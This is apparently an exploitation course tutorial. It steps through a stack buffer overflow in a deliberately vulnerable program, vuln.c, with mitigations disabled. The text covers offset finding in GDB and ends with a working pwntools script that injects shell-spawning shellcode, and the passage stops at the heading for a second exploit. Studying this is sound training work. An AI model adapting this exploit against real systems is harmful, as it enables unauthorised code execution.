### An Oral History of Binary Exploitation Defences
This course entails writing an exploit for the vuln.c program that is intentionally vulnerable to a stack buffer overflow. At first, all mitigations are disabled and will each be enabled in iterations which in effect warrant updating the exploit to work around them.

### Tools
- [GDB](https://www.gdbtutorial.com/tutorial/how-install-gdb) 
- [Ghidra](https://ghidra-sre.org/)
- [Pwntools](https://docs.pwntools.com/en/latest/)
- [ROPgadget](https://github.com/JonathanSalwan/ROPgadget)

Disable ASLR on host OS
```sh
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

Compile vuln.c with no protections
```sh
gcc vuln.c -o vuln_1 -fno-stack-protector -fcf-protection=none -no-pie -z execstack -Wl,-z,norelro
```

#### Analysis of the memory mapping of the program while it is running.
- run the program
```sh
./vuln_1
```
- attach to the program with gdb
```sh
gdb -p $(pidof vuln_1)
```
- show memory areas in use by the program and their addresses. ie. heap, libc, linker, stack
```
info proc mappings
```

#### Exploit I: Exploiting like it's 1999
- For stack buffer overflows, overwriting the saved instruction pointer of the vulnerable function on the stack is the way to go for hijacking the program's execution flow. This will allow the program to return to a user controlled address instead of the main() function in this case.

#### Finding the overflow offset
The payload has to be a minimum length of 0x100 (256) in order to fill the name buffer. Everything written past that will overwrite RBP (8 bytes) and then overwrite RIP (8 bytes).
stack layout would resemble:
```txt
[name 0x100 bytes][RBP 0x8 bytes][RIP 0x8 bytes]
```

```sh
└─$ python -c 'print("A"*0x100+"B"*64)'
```
Payload:
```txt
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
```

Using the payload above as input, and continuing execution in gdb(`c`), the program eventually encounters a segmentation fault (crash).

Examining the stack at the moment of the crash reveals the instruction pointer being overwritten caused the crash.
```
(gdb) x/32gx $rsp
0x7fffffffceb8: 0x4242424242424242      0x4242424242424242
0x7fffffffcec8: 0x4242424242424242      0x4242424242424242
0x7fffffffced8: 0x4242424242424242      0x000000010040000a
0x7fffffffcee8: 0x00000000004011f9      0x00007fffffffcfe8
0x7fffffffcef8: 0x30aeb707c04a935f      0x0000000000000001
0x7fffffffcf08: 0x0000000000000000      0x00007ffff7ffd000
0x7fffffffcf18: 0x0000000000403130      0x30aeb707c32a935f
0x7fffffffcf28: 0x30aea74f85f4935f      0x00007fff00000000
0x7fffffffcf38: 0x0000000000000000      0x0000000000000000
0x7fffffffcf48: 0x0000000000000001      0x00007fffffffcfe0
0x7fffffffcf58: 0x420df66049702900      0x00007fffffffcfc0
0x7fffffffcf68: 0x00007ffff7dbeecc      0x00007fffffffcff8
0x7fffffffcf78: 0x0000000000403130      0x00007fffffffcff8
0x7fffffffcf88: 0x00000000004011f9      0x0000000000000000
0x7fffffffcf98: 0x0000000000000000      0x0000000000401060
0x7fffffffcfa8: 0x00007fffffffcfe0      0x0000000000000000
```
`x32gx $rsp` means to e**x**amine **32** bytes of memory in hex format **(g)**, from $rsp (the stack pointer).

From this, RSP (the stack pointer) can be seen to be pointing to address `0x7fffffffceb8` before the crash.

The actual instruction where the crash happens on is found to be `ret`, which is the last instruction in the overflow function at address `0x4011f8`.
```
(gdb) x/i $rip
=> 0x4011f8 <overflow+178>:     ret
```
`x/i $rip` means to e**x**amine the **i**nstruction at $rip (the instruction pointer).

`ret` pops 8 bytes from the top of the stack and tries to execute them as an address. Under normal conditions, the saved instruction pointer(RIP) that points to main() is popped from the stack and executed. However, in this case, the payload has overwritten the saved instruction pointer with 0x4242424242424242 (BBBBBBBB), causing the program to crash.

Right after the overwritten instruction pointer (RIP), there are another 4 quad words(32 bytes) that were part of the payload.

This means that the correct offset would be:
```
"A"*0x100         [256]
"B"*(64-32-8)     [24]
Total             [280]
```

##### NOTE: The stack is always at the same location and always has the same layout.

With the correct offset and the above information, the start of the buffer is now known.

This can be demonstrated by trying to crash the program again with the correct offset. To generate the payload, the command should now be:
```sh
└─$ python -c 'print("A"*280 + "B"*8)'
```
Payload:
```
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB
```
Looking at the stack pointer after the crash, it is verified that the instruction pointer was overwritten by "0x42"*8 ("B"s).
```
(gdb) x/2gx $rsp
0x7fffffffceb8: 0x4242424242424242      0x00007fffffffcf0a
```
The beginning of the buffer can now be verified by:
```
(gdb) x/32gx $rsp-280-16
0x7fffffffcd90: 0x00007fffffffceb0      0x00000000004011dc
0x7fffffffcda0: 0x4141414141414141      0x4141414141414141  << ** start of buffer **
0x7fffffffcdb0: 0x4141414141414141      0x4141414141414141              |||
0x7fffffffcdc0: 0x4141414141414141      0x4141414141414141              vvv
0x7fffffffcdd0: 0x4141414141414141      0x4141414141414141
0x7fffffffcde0: 0x4141414141414141      0x4141414141414141
0x7fffffffcdf0: 0x4141414141414141      0x4141414141414141
0x7fffffffce00: 0x4141414141414141      0x4141414141414141
0x7fffffffce10: 0x4141414141414141      0x4141414141414141
0x7fffffffce20: 0x4141414141414141      0x4141414141414141
0x7fffffffce30: 0x4141414141414141      0x4141414141414141
0x7fffffffce40: 0x4141414141414141      0x4141414141414141
0x7fffffffce50: 0x4141414141414141      0x4141414141414141
0x7fffffffce60: 0x4141414141414141      0x4141414141414141
0x7fffffffce70: 0x4141414141414141      0x4141414141414141
0x7fffffffce80: 0x4141414141414141      0x4141414141414141
```

The buffer starts where it is expected: `$rsp-280`
At this point, everything required to craft an exploit is known. Python and pwntools will be used to interact with the process and generate shellcode.
The exploit will entail writing shellcode into the buffer that starts at address `0x7fffffffcda0` then filling up the rest of it until the 280 offset mark then overwriting the RIP(instruction pointer) with the address `0x7fffffffcda0` so that it points back to the start of the buffer and executes the shellcode.
The layout would be:
```
0x7fffffffcda0            280
      |                    |
      |[  BUFFER  ][ RBP ] | [ RIP ]
      [Shellcode|AAAAAAA...][0x7fffffffcda0]
      ^                          |
      |                          |
      |                          |
      ----------------------------
    start
    of the
    buffer
```

exploit_1
```py
#!/usr/bin/env python3

from pwn import *

# overflow offset at 280 or 0x118 bytes
rip_offset = 0x118

# set new instruction pointer to point to the start of the buffer
rip_new = 0x7fffffffcda0

# set cpu architecture for pwntools to be 64 bit
context.update(arch="amd64")

# craft shellcode
shellcode = asm(shellcraft.amd64.linux.sh())

# shellcode
payload = shellcode

# Add padding between shellcode and overflow offset (280).
payload += b"A" * (rip_offset - len(shellcode))

# pack new return address(start of the buffer) to little endian format and attach to the end of the payload
payload += p64(rip_new)

# connect to the vulnerable program
p = process("../../vuln_1")

# send payload
p.sendafter(b"Hey, whats your name!?\n", payload)
p.sendafter(b"is this name correct? (y/n)?\n", b"y/n")

p.interactive()
```

#### Exploit II: Improving reliablity with a NOP sled.